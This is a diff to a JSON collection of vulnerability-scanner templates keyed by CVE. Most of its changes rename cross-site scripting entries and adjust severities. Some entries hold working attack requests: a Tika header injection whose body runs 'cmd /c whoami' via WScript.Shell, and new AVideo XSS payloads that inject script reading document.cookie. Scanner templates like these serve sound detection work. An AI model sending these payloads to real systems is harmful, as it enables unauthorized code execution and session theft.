@@ -3428,7 +3428,7 @@
       "id": "CVE-2014-8682",
       "info": {
         "name": "Gogs (Go Git Service) - SQL Injection",
-        "severity": "high"
+        "severity": "critical"
       },
       "requests": [
         {
@@ -6575,11 +6575,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript"
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -14516,7 +14516,7 @@
     {
       "id": "CVE-2021-24300",
       "info": {
-        "name": "PickPlugins Product Slider for WooCommerce < 1.13.22 - XSS",
+        "name": "WordPress WooCommerce <1.13.22 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14531,7 +14531,7 @@
     {
       "id": "CVE-2021-24316",
       "info": {
-        "name": "An Unauthenticated Reflected XSS & XFS Mediumish theme through 1.0.47 for WordPress",
+        "name": "WordPress Mediumish Theme <=1.0.47 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14546,7 +14546,7 @@
     {
       "id": "CVE-2021-24320",
       "info": {
-        "name": "Bello WordPress Theme < 1.6.0 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Bello Directory & Listing Theme <1.6.0 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14561,7 +14561,7 @@
     {
       "id": "CVE-2021-24335",
       "info": {
-        "name": "Car Repair Services < 4.0 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Car Repair Services & Auto Mechanic Theme <4.0 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14591,7 +14591,7 @@
     {
       "id": "CVE-2021-24342",
       "info": {
-        "name": "JNews < 8.0.6 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress JNews Theme <8.0.6 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14620,7 +14620,7 @@
     {
       "id": "CVE-2021-24364",
       "info": {
-        "name": "Jannah < 5.4.4 (XSS)",
+        "name": "WordPress Jannah Theme <5.4.4 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14650,7 +14650,7 @@
     {
       "id": "CVE-2021-24387",
       "info": {
-        "name": "Real Estate 7 WordPress Theme < 3.1.1 - Unauthenticated Reflected XSS",
+        "name": "WordPress Pro Real Estate 7 Theme <3.1.1 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14664,7 +14664,7 @@
     {
       "id": "CVE-2021-24389",
       "info": {
-        "name": "FoodBakery < 2.2 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress FoodBakery <2.2 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14694,7 +14694,7 @@
     {
       "id": "CVE-2021-24407",
       "info": {
-        "name": "Jannah < 5.4.5 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Jannah Theme <5.4.5 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14722,7 +14722,7 @@
     {
       "id": "CVE-2021-24488",
       "info": {
-        "name": "WordPress Plugin Post Grid < 2.1.8 - XSS",
+        "name": "WordPress Post Grid <2.1.8 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14737,7 +14737,7 @@
     {
       "id": "CVE-2021-24495",
       "info": {
-        "name": "Wordpress Plugin Marmoset Viewer XSS",
+        "name": "Wordpress Marmoset Viewer <1.9.3 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14753,7 +14753,7 @@
     {
       "id": "CVE-2021-24498",
       "info": {
-        "name": "Calendar Event Multi View < 1.4.01 - Unauthenticated Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Calendar Event Multi View <1.4.01 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14782,7 +14782,7 @@
     {
       "id": "CVE-2021-24510",
       "info": {
-        "name": "MF Gig Calendar <= 1.1 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress MF Gig Calendar <=1.1 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14859,7 +14859,7 @@
     {
       "id": "CVE-2021-24891",
       "info": {
-        "name": "Elementor < 3.1.4 - DOM Cross-Site-Scripting",
+        "name": "WordPress Elementor Website Builder <3.1.4 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14875,7 +14875,7 @@
     {
       "id": "CVE-2021-24910",
       "info": {
-        "name": "Transposh WordPress < 1.0.7 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Transposh Translation <1.0.8 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14890,7 +14890,7 @@
     {
       "id": "CVE-2021-24926",
       "info": {
-        "name": "WordPress Plugin Domain Check < 1.0.17 - XSS",
+        "name": "WordPress Domain Check <1.0.17 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14920,7 +14920,7 @@
     {
       "id": "CVE-2021-24987",
       "info": {
-        "name": "Super Socializer < 7.13.30 - Reflected Cross-Site Scripting",
+        "name": "WordPress Super Socializer <7.13.30 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15039,7 +15039,7 @@
     {
       "id": "CVE-2021-25063",
       "info": {
-        "name": "Contact Form 7 Skins <= 2.5.0 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Contact Form 7 Skins <=2.5.0 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15069,7 +15069,7 @@
     {
       "id": "CVE-2021-25075",
       "info": {
-        "name": "WordPress Duplicate Page or Post < 1.5.1 - Stored XSS",
+        "name": "WordPress Duplicate Page or Post <1.5.1 - Cross-Site Scripting",
         "severity": "low"
       },
       "requests": [
@@ -15247,7 +15247,7 @@
     {
       "id": "CVE-2021-26247",
       "info": {
-        "name": "Unauthenticated XSS Cacti - auth_changepassword.php",
+        "name": "Cacti - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15276,7 +15276,7 @@
     {
       "id": "CVE-2021-26475",
       "info": {
-        "name": "EPrints 3.4.2 XSS",
+        "name": "EPrints 3.4.2 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15306,7 +15306,7 @@
     {
       "id": "CVE-2021-26702",
       "info": {
-        "name": "EPrints 3.4.2 XSS",
+        "name": "EPrints 3.4.2 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15321,7 +15321,7 @@
     {
       "id": "CVE-2021-26710",
       "info": {
-        "name": "Redwood v4.3.4.5-v4.5.3 XSS",
+        "name": "Redwood Report2Web 4.3.4.5 & 4.5.3 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15336,7 +15336,7 @@
     {
       "id": "CVE-2021-26723",
       "info": {
-        "name": "Jenzabar v9.20-v9.2.2 XSS",
+        "name": "Jenzabar 9.2x-9.2.2 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15351,7 +15351,7 @@
     {
       "id": "CVE-2021-26812",
       "info": {
-        "name": "Moodle jitsi plugin XSS",
+        "name": "Moodle Jitsi Meet 2.7-2.8.3 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15395,7 +15395,7 @@
     {
       "id": "CVE-2021-27309",
       "info": {
-        "name": "Clansphere CMS 2011.4 - Reflected XSS",
+        "name": "Clansphere CMS 2011.4 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15410,7 +15410,7 @@
     {
       "id": "CVE-2021-27310",
       "info": {
-        "name": "Clansphere CMS 2011.4 - Reflected Cross-Site Scripting (XSS)",
+        "name": "Clansphere CMS 2011.4 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15425,7 +15425,7 @@
     {
       "id": "CVE-2021-27330",
       "info": {
-        "name": "Triconsole 3.75 XSS",
+        "name": "Triconsole Datepicker Calendar <3.77 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15454,7 +15454,7 @@
     {
       "id": "CVE-2021-27519",
       "info": {
-        "name": "FUDForum 3.1.0 - Reflected XSS",
+        "name": "FUDForum 3.1.0 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15775,7 +15775,7 @@
     {
       "id": "CVE-2021-29484",
       "info": {
-        "name": "DOM XSS in Ghost CMS",
+        "name": "Ghost CMS <=4.32 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15821,7 +15821,7 @@
     {
       "id": "CVE-2021-29625",
       "info": {
-        "name": "Adminer reflected XSS via the table parameter",
+        "name": "Adminer <=4.8.0 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15836,7 +15836,7 @@
     {
       "id": "CVE-2021-3002",
       "info": {
-        "name": "Seo Panel 4.8.0 - Post based Reflected XSS",
+        "name": "Seo Panel 4.8.0 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15850,7 +15850,7 @@
     {
       "id": "CVE-2021-30049",
       "info": {
-        "name": "SysAid Technologies 20.3.64 b14 Reflected XSS",
+        "name": "SysAid Technologies 20.3.64 b14 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15865,7 +15865,7 @@
     {
       "id": "CVE-2021-30151",
       "info": {
-        "name": "Sidekiq 5.1.3 and 6.x-6.2.0 - Cross-Site Scripting",
+        "name": "Sidekiq <=6.2.0 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15910,7 +15910,7 @@
     {
       "id": "CVE-2021-30213",
       "info": {
-        "name": "Knowage Suite 7.3 XSS",
+        "name": "Knowage Suite 7.3 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15969,7 +15969,7 @@
     {
       "id": "CVE-2021-31250",
       "info": {
-        "name": "CHIYU IoT XSS",
+        "name": "CHIYU TCP/IP Converter - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -16006,7 +16006,7 @@
     {
       "id": "CVE-2021-31537",
       "info": {
-        "name": "SIS-REWE GO version 7.5.0/12C XSS",
+        "name": "SIS Informatik REWE GO SP17 <7.7 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -16036,7 +16036,7 @@
     {
       "id": "CVE-2021-31589",
       "info": {
-        "name": "BeyondTrust Remote Support Reflected XSS",
+        "name": "BeyondTrust Secure Remote Access Base <=6.0.1 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -16125,7 +16125,7 @@
     {
       "id": "CVE-2021-31862",
       "info": {
-        "name": "SysAid - Reflected XSS",
+        "name": "SysAid 20.4.74 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -16283,7 +16283,7 @@
     {
       "id": "CVE-2021-32853",
       "info": {
-        "name": "Erxes <= v0.23.0 XSS",
+        "name": "Erxes <0.23.0 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -16460,7 +16460,7 @@
     {
       "id": "CVE-2021-33904",
       "info": {
-        "name": "Accela Civic Platform 21.1 - 'servProvCode' XSS",
+        "name": "Accela Civic Platform <=21.1 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -16475,7 +16475,7 @@
     {
       "id": "CVE-2021-34370",
       "info": {
-        "name": "Accela Civic Platform 21.1 - Open Redirect & XSS",
+        "name": "Accela Civic Platform <=21.1 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -16537,7 +16537,7 @@
     {
       "id": "CVE-2021-34640",
       "info": {
-        "name": "Securimage-WP-Fixed <= 3.5.4 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Securimage-WP-Fixed <=3.5.4 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -16552,7 +16552,7 @@
     {
       "id": "CVE-2021-34643",
       "info": {
-        "name": "Skaut bazar < 1.3.3 - Reflected Cross-Site Scripting",
+        "name": "WordPress Skaut Bazar <1.3.3 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -16720,7 +16720,7 @@
     {
       "id": "CVE-2021-36450",
       "info": {
-        "name": "Verint 15.2 - Cross Site Scripting",
+        "name": "Verint Workforce Optimization 15.2.8.10048 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -16779,7 +16779,7 @@
     {
       "id": "CVE-2021-37216",
       "info": {
-        "name": "QSAN Storage Manager prior to v3.3.3 Reflected XSS",
+        "name": "QSAN Storage Manager <3.3.3 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -16797,7 +16797,7 @@
     {
       "id": "CVE-2021-37416",
       "info": {
-        "name": "Zoho ManageEngine ADSelfService Plus - Reflected XSS",
+        "name": "Zoho ManageEngine ADSelfService Plus <=6103 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -16888,7 +16888,7 @@
     {
       "id": "CVE-2021-37833",
       "info": {
-        "name": "Hotel Druid 3.0.2 XSS",
+        "name": "Hotel Druid 3.0.2 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -17676,7 +17676,7 @@
     {
       "id": "CVE-2021-42063",
       "info": {
-        "name": "SAP Knowledge Warehouse (KW) - Reflected XSS",
+        "name": "SAP Knowledge Warehouse <=7.5.0 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -18169,7 +18169,7 @@
     {
       "id": "CVE-2021-45422",
       "info": {
-        "name": "Reprise License Manager 14.2 - Reflected XSS",
+        "name": "Reprise License Manager 14.2 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -18339,7 +18339,7 @@
     {
       "id": "CVE-2022-0140",
       "info": {
-        "name": "WordPress Visual Form Builder < 3.0.6 - Unauthenticated Information Disclosure",
+        "name": "WordPress Visual Form Builder <3.0.8 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -18353,7 +18353,7 @@
     {
       "id": "CVE-2022-0148",
       "info": {
-        "name": "All-in-one Floating Contact Form < 2.0.4 - Authenticated Reflected XSS",
+        "name": "WordPress All-in-one Floating Contact Form <2.0.4 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -20570,6 +20570,51 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/loginsave.php?u=http://interact.sh"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-32770",
+      "info": {
+        "name": "WWBN AVideo 11.6 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?toast=%3C%2Fscript%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-32771",
+      "info": {
+        "name": "WWBN AVideo 11.6 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?success=%3C%2Fscript%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-32772",
+      "info": {
+        "name": "WWBN AVideo 11.6 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E"
           ]
         }
       ]
